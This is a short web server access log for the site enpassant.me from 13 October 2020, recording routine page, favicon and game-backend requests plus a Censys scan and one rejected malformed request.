85.153.207.202 - - [13/Oct/2020:10:07:01 +0000] "GET / HTTP/1.1" 200 200 "-" "WhatsApp/2.20.200.22 A"
212.253.48.86 - - [13/Oct/2020:10:07:15 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:07:15 +0000] "GET /favicon.ico HTTP/1.1" 200 200 "https://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:08:03 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:08:03 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://enpassant.me/backend/games/76561198047135457" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
176.55.110.117 - - [13/Oct/2020:10:08:07 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "-" "WhatsApp/2.20.102 i"
85.153.207.202 - - [13/Oct/2020:10:09:03 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:09:03 +0000] "GET /favicon.ico HTTP/1.1" 200 200 "http://enpassant.me/backend/games/76561198047135457" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:16:33 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:16:35 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:16:35 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:16:39 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
128.14.209.234 - - [13/Oct/2020:10:47:53 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.142.125.50 - - [13/Oct/2020:11:37:28 +0000] "GET / HTTP/1.1" 200 250 "-" "-"
162.142.125.50 - - [13/Oct/2020:11:37:28 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
161.35.238.241 - - [13/Oct/2020:11:45:48 +0000] "\x00\x0E86.\x1F\xB0\xCBu\x7F\x16\x00\x00\x00\x00\x00" 400 166 "-" "-"
212.253.48.86 - - [13/Oct/2020:12:01:43 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
